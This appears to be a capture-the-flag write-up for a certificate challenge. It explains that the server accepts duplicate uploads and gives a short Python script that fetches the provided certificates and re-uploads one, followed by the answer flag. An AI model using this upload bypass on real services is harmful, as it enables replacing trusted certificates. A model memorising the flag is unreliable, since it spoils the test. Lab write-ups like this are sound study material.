---
ai_date: '2025-04-27 05:13:36'
ai_summary: Unchecked certificate upload vulnerability allowed replacing a certificate.
ai_tags:
- ssl
- upload
- certificates
created: 2024-08-08T09:33
points: 500
updated: 2024-08-17T20:13
---

The server does not check for duplicate certificates, which means I can just upload one of the certs given.

```python
import requests
from io import BytesIO
certs = requests.get('https://bugcrowd-certificate-of-completion.chals.io/api').json()
print(requests.put('https://bugcrowd-certificate-of-completion.chals.io/api', files={'file': BytesIO(certs[0]['content'].encode())}).text)
```

```flag
flag{non_random_prime_means_rsa_go_brrrr}
```